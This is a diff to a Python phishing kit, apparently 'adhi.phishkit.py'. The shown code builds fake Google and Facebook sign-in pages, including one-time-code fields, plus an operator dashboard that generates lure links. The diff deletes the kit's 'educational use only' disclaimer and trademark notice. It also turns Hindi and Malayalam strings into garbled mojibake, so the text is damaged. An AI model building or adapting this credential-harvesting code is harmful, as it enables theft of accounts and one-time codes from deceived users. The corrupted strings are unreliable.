@@ -4,12 +4,6 @@
 
   python3 adhi.phishkit.py -p 8080
   python3 adhi.phishkit.py -p 8080 --local
-
-FOR EDUCATIONAL / RESEARCH USE ONLY.
-Not affiliated with Google, Meta, Apple, Microsoft, Amazon, X, or any bank,
-telecom, wallet provider, game publisher or government portal. All trademarks
-belong to their owners. Replicas are approximations, not official mirrors.
-MIT licensed - see LICENSE.
 """
 import argparse, base64, contextlib, csv, html, io, json, os, platform as _plat, re, secrets
 import shutil, socket, sqlite3, subprocess, sys, tarfile, tempfile, threading, time, traceback
@@ -2033,12 +2027,12 @@ def lay_google(s, tok, step, ctx):
     form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner + "</form>"
     mob = ("<div class='pg'><div class='lg'>" + GOOGLE + "</div>" + form + "</div>"
            "<div class='ft'><select class='lang'><option>English (United States)</option>"
-           "<option>English (United Kingdom)</option><option>हिन्दी</option></select><span class='sp'></span>"
+           "<option>English (United Kingdom)</option><option>à¤¹à¤¿à¤¨à¥à¤¦à¥</option></select><span class='sp'></span>"
            "<a>Help</a><a>Privacy</a><a>Terms</a></div>")
     desk = ("<div class='pg ctr'><div class='card'><div class='lg' style='margin-bottom:22px'>" + GOOGLE_G +
             "</div>" + form + "</div></div>"
             "<div class='ft'><select class='lang'><option>English (United States)</option>"
-            "<option>English (United Kingdom)</option><option>हिन्दी</option></select><span class='sp'></span>"
+            "<option>English (United Kingdom)</option><option>à¤¹à¤¿à¤¨à¥à¤¦à¥</option></select><span class='sp'></span>"
             "<a>Help</a><a>Privacy</a><a>Terms</a></div>")
     css = """
 body{background:#fff;color:#202124;font-family:Roboto,'Helvetica Neue',Arial,sans-serif}
@@ -2126,7 +2120,7 @@ def lay_fb(s, tok, step, ctx):
                                                                         CFG["otp_len"]))
     form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner + "</form>"
     mob = ("<div class='bar'>" + FBL + "<span class='wd'>facebook</span></div><div class='w'>" + form + "</div>"
-           "<div class='foot'>English (UK) &middot; മലയാളം &middot; हिन्दी &middot; More languages<br><br>"
+           "<div class='foot'>English (UK) &middot; à´®à´²à´¯à´¾à´³à´ &middot; à¤¹à¤¿à¤¨à¥à¤¦à¥ &middot; More languages<br><br>"
            "Meta &copy; 2026</div>")
     desk = ("<div class='dwrap'><div class='big'>facebook</div><div class='dcard'>" + form + "</div></div>"
             "<div class='foot'>Meta &middot; About &middot; Privacy &middot; Terms &middot; Cookies</div>")
@@ -3771,7 +3765,7 @@ def a_dash():
              "<button class='on' data-d='auto' onclick=\"pick_dev('auto')\">Auto</button>"
              "<button data-d='mobile' onclick=\"pick_dev('mobile')\">Mobile</button>"
              "<button data-d='laptop' onclick=\"pick_dev('laptop')\">Laptop</button></div>"
-             "<div class='hint'>എപ്പോഴും ഒറ്റ ലിങ്ക്. ഡിവൈസ് സ്വയം തിരിച്ചറിയും. "
+             "<div class='hint'>à´à´ªàµà´ªàµà´´àµà´ à´à´±àµà´± à´²à´¿à´àµà´àµ. à´¡à´¿à´µàµà´¸àµ à´¸àµà´µà´¯à´ à´¤à´¿à´°à´¿à´àµà´à´±à´¿à´¯àµà´. "
              "<a id='pv' href='#' target='_blank'>preview</a></div>"
              "<label>Quantity</label><input id='n' type='number' min='1' max='50' value='1'>"
              "<div class='row'><button class='p' id='gp' onclick=\"gen(0)\">Generate link</button>"
